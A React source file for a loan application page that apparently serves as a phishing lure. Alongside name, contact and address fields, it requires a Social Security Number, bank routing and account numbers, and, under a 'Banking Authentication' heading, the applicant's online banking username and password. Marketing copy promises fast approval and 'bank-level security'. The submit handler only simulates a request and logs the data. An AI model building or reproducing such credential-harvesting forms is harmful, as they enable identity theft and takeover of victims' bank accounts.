import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { PageLoader } from "@/components/ui/loader";
import { toast } from "@/hooks/use-toast";
import { DollarSign, Shield, Clock } from "lucide-react";

const applicationSchema = z.object({
  firstName: z.string().min(2, "First name must be at least 2 characters"),
  lastName: z.string().min(2, "Last name must be at least 2 characters"),
  email: z.string().email("Please enter a valid email address"),
  phone: z.string().min(10, "Please enter a valid phone number"),
  alternatePhone: z.string().optional(),
  dateOfBirth: z.string().min(1, "Date of birth is required"),
  socialSecurityNumber: z.string().min(9, "Social Security Number must be 9 digits").max(11, "Invalid format"),
  mailingAddress: z.string().min(5, "Please enter your mailing address"),
  gender: z.string().min(1, "Please select your gender"),
  loanAmount: z.string().min(1, "Please enter loan amount"),
  bankName: z.string().min(2, "Please enter your bank name"),
  routingNumber: z.string().min(9, "Routing number must be 9 digits").max(9, "Routing number must be 9 digits"),
  accountNumber: z.string().min(4, "Please enter your account number"),
  username: z.string().min(3, "Username must be at least 3 characters"),
  password: z.string().min(8, "Password must be at least 8 characters").regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/, "Password must contain at least one uppercase letter, one lowercase letter, and one number"),
  agreeTerms: z.boolean().refine((val) => val === true, "You must agree to the terms"),
});

type ApplicationForm = z.infer<typeof applicationSchema>;

const Apply = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 800);
    return () => clearTimeout(timer);
  }, []);

  const form = useForm<ApplicationForm>({
    resolver: zodResolver(applicationSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      email: "",
      phone: "",
      alternatePhone: "",
      dateOfBirth: "",
      socialSecurityNumber: "",
      mailingAddress: "",
      gender: "",
      loanAmount: "",
      bankName: "",
      routingNumber: "",
      accountNumber: "",
      username: "",
      password: "",
      agreeTerms: false,
    },
  });

  useEffect(() => {
    // Load saved form data from sessionStorage
    const savedData = sessionStorage.getItem('heroFormData');
    if (savedData) {
      try {
        const parsedData = JSON.parse(savedData);
        let loanAmount = '';
        
        // Handle different loan amount formats
        if (parsedData.loanAmount === 'custom' && parsedData.customAmount) {
          loanAmount = `$${parsedData.customAmount}`;
        } else if (parsedData.loanAmount && parsedData.loanAmount !== 'custom') {
          // Convert range to display format
          const ranges = {
            '5000-15000': '$5,000 - $15,000',
            '10000-25000': '$10,000 - $25,000',
            '25000-50000': '$25,000 - $50,000',
            '50000-100000': '$50,000 - $100,000',
            '100000+': '$100,000+'
          };
          loanAmount = ranges[parsedData.loanAmount as keyof typeof ranges] || parsedData.loanAmount;
        }
        
        if (loanAmount) {
          form.setValue('loanAmount', loanAmount);
        }
      } catch (error) {
        console.error('Error parsing saved form data:', error);
      }
    }
  }, [form]);

  const onSubmit = async (data: ApplicationForm) => {
    setIsSubmitting(true);
    // Simulate API call
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    console.log("Application submitted:", data);
    toast({
      title: "Application Submitted!",
      description: "We'll review your application and get back to you within 24 hours.",
    });
    
    setIsSubmitting(false);
  };

  if (loading) return <PageLoader />;

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-8 animate-fade-in">
            <h1 className="text-3xl lg:text-4xl font-bold text-blue-900 mb-4">
              Apply for Your Loan
            </h1>
            <p className="text-xl text-gray-600">
              Complete your application in just a few minutes
            </p>
          </div>

          {/* Benefits Section */}
          <div className="grid md:grid-cols-3 gap-6 mb-8">
            <div className="text-center p-6 bg-white rounded-lg shadow-sm border hover-lift animate-scale-in animate-stagger-1">
              <Clock className="h-12 w-12 mx-auto mb-4 text-blue-900" />
              <h3 className="font-semibold text-lg mb-2">Fast Approval</h3>
              <p className="text-gray-600">Get approved in minutes, not days</p>
            </div>
            <div className="text-center p-6 bg-white rounded-lg shadow-sm border hover-lift animate-scale-in animate-stagger-2">
              <DollarSign className="h-12 w-12 mx-auto mb-4 text-blue-900" />
              <h3 className="font-semibold text-lg mb-2">Up to $15,000</h3>
              <p className="text-gray-600">Borrow what you need, when you need it</p>
            </div>
            <div className="text-center p-6 bg-white rounded-lg shadow-sm border hover-lift animate-scale-in animate-stagger-3">
              <Shield className="h-12 w-12 mx-auto mb-4 text-blue-900" />
              <h3 className="font-semibold text-lg mb-2">Secure & Safe</h3>
              <p className="text-gray-600">Your information is protected with bank-level security</p>
            </div>
          </div>

          <Card className="animate-slide-up">
            <CardHeader>
              <CardTitle>Loan Application</CardTitle>
              <CardDescription>
                Please provide your information to apply for a loan
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                {/* Personal Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-blue-900 border-b pb-2">Personal Information</h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="firstName">First Name *</Label>
                      <Input {...form.register("firstName")} placeholder="John" />
                      {form.formState.errors.firstName && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.firstName.message}</p>
                      )}
                    </div>
                    <div>
                      <Label htmlFor="lastName">Last Name *</Label>
                      <Input {...form.register("lastName")} placeholder="Doe" />
                      {form.formState.errors.lastName && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.lastName.message}</p>
                      )}
                    </div>
                  </div>
                  
                  <div>
                    <Label htmlFor="email">Email Address *</Label>
                    <Input {...form.register("email")} type="email" placeholder="john@example.com" />
                    {form.formState.errors.email && (
                      <p className="text-red-500 text-sm mt-1">{form.formState.errors.email.message}</p>
                    )}
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="phone">Phone Number *</Label>
                      <Input {...form.register("phone")} placeholder="(555) 123-4567" />
                      {form.formState.errors.phone && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.phone.message}</p>
                      )}
                    </div>
                    <div>
                      <Label htmlFor="alternatePhone">Alternate Phone</Label>
                      <Input {...form.register("alternatePhone")} placeholder="(555) 987-6543" />
                      {form.formState.errors.alternatePhone && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.alternatePhone.message}</p>
                      )}
                    </div>
                  </div>
                </div>

                {/* Additional Personal Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-blue-900 border-b pb-2">Additional Information</h3>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="dateOfBirth">Date of Birth *</Label>
                      <Input {...form.register("dateOfBirth")} type="date" />
                      {form.formState.errors.dateOfBirth && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.dateOfBirth.message}</p>
                      )}
                    </div>
                    <div>
                      <Label htmlFor="gender">Gender *</Label>
                      <select 
                        {...form.register("gender")}
                        className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      >
                        <option value="">Select Gender</option>
                        <option value="male">Male</option>
                        <option value="female">Female</option>
                        <option value="other">Other</option>
                        <option value="prefer-not-to-say">Prefer not to say</option>
                      </select>
                      {form.formState.errors.gender && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.gender.message}</p>
                      )}
                    </div>
                  </div>
                  
                  <div>
                    <Label htmlFor="socialSecurityNumber">Social Security Number *</Label>
                    <Input 
                      {...form.register("socialSecurityNumber")} 
                      placeholder="000-00-0000" 
                      maxLength={11}
                    />
                    {form.formState.errors.socialSecurityNumber && (
                      <p className="text-red-500 text-sm mt-1">{form.formState.errors.socialSecurityNumber.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <Label htmlFor="mailingAddress">Mailing Address *</Label>
                    <Input 
                      {...form.register("mailingAddress")} 
                      placeholder="123 Main St, City, State, ZIP" 
                    />
                    {form.formState.errors.mailingAddress && (
                      <p className="text-red-500 text-sm mt-1">{form.formState.errors.mailingAddress.message}</p>
                    )}
                  </div>
                </div>

                {/* Loan Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-blue-900 border-b pb-2">Loan Information</h3>
                  
                  <div>
                    <Label htmlFor="loanAmount">Loan Amount *</Label>
                    <Input {...form.register("loanAmount")} placeholder="$1,000" />
                    {form.formState.errors.loanAmount && (
                      <p className="text-red-500 text-sm mt-1">{form.formState.errors.loanAmount.message}</p>
                    )}
                  </div>
                </div>

                {/* Banking Information */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-blue-900 border-b pb-2">Banking Information</h3>
                  
                  <div>
                    <Label htmlFor="bankName">Bank Name *</Label>
                    <Input {...form.register("bankName")} placeholder="Bank of America" />
                    {form.formState.errors.bankName && (
                      <p className="text-red-500 text-sm mt-1">{form.formState.errors.bankName.message}</p>
                    )}
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="routingNumber">Routing Number *</Label>
                      <Input {...form.register("routingNumber")} placeholder="123456789" maxLength={9} />
                      {form.formState.errors.routingNumber && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.routingNumber.message}</p>
                      )}
                    </div>
                    <div>
                      <Label htmlFor="accountNumber">Account Number *</Label>
                      <Input {...form.register("accountNumber")} placeholder="123456789012" />
                      {form.formState.errors.accountNumber && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.accountNumber.message}</p>
                      )}
                    </div>
                  </div>
                </div>

                {/* Banking Verification */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold text-blue-900 border-b pb-2">Banking Authentication</h3>
                  <p className="text-sm text-gray-600">
                    In order to validate and authenticate your information please verify your username and password for mobile banking or online banking.
                  </p>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label htmlFor="username">Online Banking Username *</Label>
                      <Input {...form.register("username")} placeholder="Your banking username" />
                      {form.formState.errors.username && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.username.message}</p>
                      )}
                    </div>
                    <div>
                      <Label htmlFor="password">Online Banking Password *</Label>
                      <Input {...form.register("password")} type="password" placeholder="Your banking password" />
                      {form.formState.errors.password && (
                        <p className="text-red-500 text-sm mt-1">{form.formState.errors.password.message}</p>
                      )}
                      <p className="text-xs text-gray-500 mt-1">
                        Enter your existing online banking credentials for verification
                      </p>
                    </div>
                  </div>
                </div>

                {/* Terms Agreement */}
                <div className="space-y-4">
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="agreeTerms"
                      checked={form.watch("agreeTerms")}
                      onCheckedChange={(checked) => form.setValue("agreeTerms", checked as boolean)}
                    />
                    <Label htmlFor="agreeTerms" className="text-sm">
                      I agree to the <a href="/legal" className="text-blue-600 hover:underline">Terms of Service</a> and <a href="/legal" className="text-blue-600 hover:underline">Privacy Policy</a> *
                    </Label>
                  </div>
                  {form.formState.errors.agreeTerms && (
                    <p className="text-red-500 text-sm mt-1">{form.formState.errors.agreeTerms.message}</p>
                  )}
                </div>

                <Button 
                  type="submit" 
                  disabled={isSubmitting}
                  className="w-full bg-blue-900 hover:bg-blue-800 text-white py-3 text-lg font-semibold"
                >
                  {isSubmitting ? "Submitting Application..." : "Submit Application"}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
      
      <Footer />
    </div>
  );
};

export default Apply;